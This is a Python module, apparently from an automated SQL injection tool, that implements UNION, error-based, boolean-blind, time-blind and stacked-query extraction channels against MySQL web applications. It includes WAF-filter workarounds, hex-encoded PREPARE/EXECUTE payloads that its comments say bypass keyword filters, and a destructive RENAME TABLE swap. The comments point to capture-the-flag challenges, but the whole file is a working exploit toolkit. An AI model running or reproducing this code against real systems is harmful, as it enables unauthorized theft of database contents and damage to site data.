"""四大取数通道（Oracle）：把任意标量 SQL 表达式的值取回来。

- UnionOracle ：回显位直接读值（最快）
- ErrorOracle ：updatexml/extractvalue 报错带回（32 字符分段）
- BoolOracle  ：布尔差异 + ascii 二分（支持按位并发）
- TimeOracle  ：sleep 延时差异 + ascii 二分（最慢，兜底）
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from .builder import PayloadBuilder
from .models import InjectionPoint, ResponseInfo, WafReport, similarity
from .session import HttpSession

MARK_L = "~~"          # union 取值包裹标记（0x7e7e）


class OracleError(RuntimeError):
    pass


class BaseOracle:
    name = "base"

    def __init__(self, session: HttpSession, inj: InjectionPoint,
                 builder: PayloadBuilder, waf: WafReport):
        self.s = session
        self.inj = inj
        self.b = builder
        self.waf = waf
        self.requests = 0

    def scalar(self, expr: str) -> str:
        """取回标量表达式的字符串值。"""
        raise NotImplementedError

    def scalar_int(self, expr: str) -> int:
        v = self.scalar(expr).strip()
        m = re.search(r"-?\d+", v)
        if not m:
            raise OracleError(f"非数值结果: {v!r} ({expr})")
        return int(m.group())


# ---------------------------------------------------------------------------
# UNION 回显通道
# ---------------------------------------------------------------------------
class UnionOracle(BaseOracle):
    name = "union"

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.inj.echo_positions or not self.inj.column_count:
            raise OracleError("缺少回显位/列数信息，UNION 通道不可用")
        if self.waf.is_filtered("concat", "union", "select"):
            raise OracleError("union/select/concat 被过滤")

    def scalar(self, expr: str) -> str:
        n = self.inj.column_count
        pos = self.inj.echo_positions[0] - 1
        cols = ["null"] * n
        cols[pos] = f"concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
        payload = self.b.wrap("union select " + ",".join(cols), base_value="0")
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
        if not m:
            raise OracleError(f"回显标记未找到（可能列数/回显位变化）: {expr}")
        val = m.group(1)
        return "" if val == "NULL" else val


# ---------------------------------------------------------------------------
# 报错通道
# ---------------------------------------------------------------------------
class ErrorOracle(BaseOracle):
    name = "error"
    CHUNK = 30          # XPATH 报错 32 字符上限

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.waf.is_filtered("updatexml"):
            self.fn = "updatexml(1,{xpath},1)"
        elif not self.waf.is_filtered("extractvalue"):
            self.fn = "extractvalue(1,{xpath})"
        else:
            raise OracleError("updatexml 与 extractvalue 均被过滤，报错通道不可用")
        if self.waf.is_filtered("concat", "substr"):
            raise OracleError("concat/substr 被过滤，报错通道不可用")

    def _chunk(self, expr: str, start: int) -> str:
        xpath = f"concat(0x7e,substr(({expr}),{start},{self.CHUNK}),0x7e)"
        payload = self.b.wrap("and " + self.fn.format(xpath=xpath))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        if not r.has_sql_error():
            raise OracleError(f"报错通道未按预期工作: {r.sql_error_text()[:80]}")
        m = re.search(r"XPATH syntax error:\s*'~([^~]*)", r.body, re.S)
        if not m:
            raise OracleError(f"无法从报错中解析数据: {r.sql_error_text()[:80]}")
        return m.group(1)

    def scalar(self, expr: str) -> str:
        out, i = [], 1
        while True:
            chunk = self._chunk(expr, i)
            if not chunk:
                break
            out.append(chunk)
            if len(chunk) < self.CHUNK:
                break
            i += self.CHUNK
        return "".join(out)


# ---------------------------------------------------------------------------
# 布尔盲注通道
# ---------------------------------------------------------------------------
class BoolOracle(BaseOracle):
    name = "bool"

    def __init__(self, *a, workers: int = 6, **kw):
        super().__init__(*a, **kw)
        self.workers = workers
        # 参照 joiner 依次尝试：or（登录框恒真/查询框多行）→ and（查询框真=基线）
        # → xor（FinalSQL 类：and/or/空格/注释全被滤，1^(cond) 真→0 假→基线）
        for joiner in ("or", "and", "xor"):
            fn = getattr(self.b, f"logic_{joiner}")
            r_true = self.s.request_value(self.b.wrap(fn("1=1")))
            r_false = self.s.request_value(self.b.wrap(fn("1=2")))
            if similarity(r_true, r_false) > 0.995:
                continue
            self.R_true, self.R_false = r_true, r_false
            self._joiner = joiner
            self.s.log("INFO", f"[bool] joiner={joiner}")
            return
        raise OracleError("or/and/xor 均无真假差异，布尔通道不可用")

    def eval_bool(self, cond: str) -> bool:
        join = getattr(self.b, f"logic_{self._joiner}")
        payload = self.b.wrap(join(cond))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        sim_t = similarity(r, self.R_true)
        sim_f = similarity(r, self.R_false)
        if max(sim_t, sim_f) < 0.90:
            # 响应与双参照均不匹配：payload 疑似被 WAF 拦截/页面结构变化，
            # 宁可早失败也不产出静默垃圾（曾把拦截页误判为恒真导致整串 '~'）
            raise OracleError(f"响应与真假参照均不匹配（疑似被拦截）: "
                              f"sim_t={sim_t:.2f} sim_f={sim_f:.2f} "
                              f"payload[:80]={payload[:80]}")
        return sim_t >= sim_f

    def _binsearch(self, cond_fmt, lo: int, hi: int) -> int:
        """cond_fmt(mid) 单调递减（true→false），返回最后为真的 mid（即真实值）。"""
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _char_at(self, expr: str, pos: int, prev: str | None = None) -> str:
        """提取 pos 位置字符；prev 为上一字符时先做游程检测（1 请求）。"""
        if prev:
            eq = "=" if not self.waf.is_filtered("=") else " like "
            if self.eval_bool(f"substr(({expr}),{pos},1){eq}substr(({expr}),{pos-1},1)"):
                return prev
        code = self._binsearch(
            lambda m: f"ascii(substr(({expr}),{pos},1))>={m}", 32, 126)
        return chr(code)

    def _extract_block(self, expr: str, start: int, end: int) -> str:
        """块内串行（游程复用前一位），块间并发。"""
        out = []
        prev = None
        for pos in range(start, end + 1):
            if self.s.stopped:
                raise OracleError("用户中止")
            ch = self._char_at(expr, pos, prev)
            out.append(ch)
            prev = ch or None
        return "".join(out)

    def scalar(self, expr: str) -> str:
        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
            raise OracleError("ascii/substr 被过滤，布尔通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 1024)
        self.s.log("INFO", f"[bool] 长度={length}，分块并发提取: {expr[:60]}")
        result = [""] * length
        BLOCK = 16
        blocks = [(i + 1, min(i + BLOCK, length)) for i in range(0, length, BLOCK)]
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {ex.submit(self._extract_block, expr, a, b): (a, b)
                    for a, b in blocks}
            for f in as_completed(futs):
                a, b = futs[f]
                result[a - 1:b] = f.result()
        return "".join(result)


# ---------------------------------------------------------------------------
# 堆叠通道（PREPARE + 十六进制，强网杯"随便注"类环境）
# ---------------------------------------------------------------------------
def parse_php_arrays(text: str) -> list:
    """解析 var_dump/print_r 风格回显，返回每个 array(...) 的值列表。"""
    rows = []
    for m in re.finditer(r"array\(\d+\)\s*\{(.*?)\n\}", text, re.S):
        vals = []
        for sm in re.finditer(r'string\(\d+\)\s+"((?:[^"\\]|\\.)*)"|int\((-?\d+)\)|=>\s*\n?\s*NULL', m.group(1)):
            if sm.group(1) is not None:
                vals.append(sm.group(1))
            elif sm.group(2) is not None:
                vals.append(sm.group(2))
            else:
                vals.append("NULL")
        if vals:
            rows.append(vals)
    return rows


class StackedOracle(BaseOracle):
    """堆叠注入取数通道：SET @a=0x{hex(sql)};PREPARE a FROM @a;EXECUTE a;

    预处理语句把完整 select 编码为十六进制，绕过一切关键字/点号过滤；
    结果经 var_dump 回显解析（~~标记包裹）。"""
    name = "stacked"

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if self.waf.is_filtered(";"):
            raise OracleError("分号被过滤，堆叠通道不可用")
        if self.waf.is_filtered("prepare") or self.waf.is_filtered("execute"):
            raise OracleError("prepare/execute 被过滤（可尝试 handler 读取）")

    def run_stacked(self, statements: str, neutralize: bool = True) -> list:
        """执行任意分号分隔的语句（statements 不含原查询前缀），返回回显数组。"""
        base = "0" if neutralize else self.inj.base_value
        pre = base if self.inj.numeric else base + self.inj.closure
        from ..tampers import to_hex_literal
        payload = f"{pre};{statements.strip('; ')};{self.inj.comment}"
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return parse_php_arrays(r.body)

    def scalar(self, expr: str) -> str:
        from ..tampers import to_hex_literal
        sql = f"select concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
        stmts = (f"SET @a={to_hex_literal(sql)};"
                 f"PREPARE a FROM @a;EXECUTE a")
        try:
            payload = (f"{'0' if not self.inj.numeric else '0'}{self.inj.closure}"
                       f";{stmts};{self.inj.comment}")
            r = self.s.request_value(payload)
            self.requests += 1
            if r.status_code < 0:
                raise OracleError("请求失败")
            m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
            if m:
                val = m.group(1)
                return "" if val == "NULL" else val
        except OracleError:
            raise
        raise OracleError(f"PREPARE 回显标记未找到: {expr[:60]}")

    def show_tables(self) -> list:
        rows = self.run_stacked("SHOW TABLES")
        return [v for row in rows for v in row if v]

    def show_columns(self, table: str) -> list:
        rows = self.run_stacked(f"SHOW COLUMNS FROM `{table}`")
        # 每列一行 array，[0] 为列名
        return [row[0] for row in rows if row]

    def handler_first(self, table: str) -> list:
        rows = self.run_stacked(f"HANDLER `{table}` OPEN;HANDLER `{table}` READ FIRST")
        return rows[0] if rows else []

    def rename_swap(self, flag_table: str, flag_col: str,
                    orig_table: str = "words", orig_col: str = "id"):
        """RENAME 换表法（破坏性 DDL，需用户确认）。"""
        stmts = (f"RENAME TABLE `{orig_table}` TO `{orig_table}_bak`;"
                 f"RENAME TABLE `{flag_table}` TO `{orig_table}`;"
                 f"ALTER TABLE `{orig_table}` CHANGE `{flag_col}` `{orig_col}` VARCHAR(100)")
        self.run_stacked(stmts, neutralize=False)


# ---------------------------------------------------------------------------
# 时间盲注通道
# ---------------------------------------------------------------------------
class TimeOracle(BaseOracle):
    name = "time"
    THRESHOLD_MS = 1800

    def __init__(self, *a, delay: float = 2.0, **kw):
        super().__init__(*a, **kw)
        self.delay = delay
        if self.waf.is_filtered("sleep"):
            raise OracleError("sleep 被过滤，时间通道不可用")
        # joiner 自适应：or 恒真（登录框 and 会因密码恒假短路）→ and → xor
        for joiner in ("or", "and", "xor"):
            self._joiner = joiner
            fn = getattr(self.b, f"logic_{joiner}")
            r = self.s.request_value(self.b.wrap(fn(f"sleep({delay})")))
            if r.elapsed_ms >= self.delay * 1000 * 0.75:
                return
        if not self.waf.is_filtered("if"):
            raise OracleError("or/and/xor 均无法触发延时，时间通道不可用")

    def eval_bool(self, cond: str) -> bool:
        join = getattr(self.b, f"logic_{self._joiner}")
        if not self.waf.is_filtered("if"):
            core = join(f"if(({cond}),sleep({self.delay}),0)")
        else:
            core = join(f"sleep({self.delay}*({cond}))")
        payload = self.b.wrap(core)
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return r.elapsed_ms >= self.delay * 1000 * 0.75

    def _binsearch(self, cond_fmt, lo, hi):
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar(self, expr: str) -> str:
        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
            raise OracleError("ascii/substr 被过滤，时间通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 512)
        self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
        out = []
        prev = None
        for p in range(1, length + 1):
            if self.s.stopped:
                raise OracleError("用户中止")
            if prev:
                eq = "=" if not self.waf.is_filtered("=") else " like "
                if self.eval_bool(f"substr(({expr}),{p},1){eq}substr(({expr}),{p-1},1)"):
                    out.append(prev)
                    continue
            code = self._binsearch(lambda m: f"ascii(substr(({expr}),{p},1))>={m}", 32, 126)
            ch = chr(code)
            out.append(ch)
            prev = ch or None
        return "".join(out)
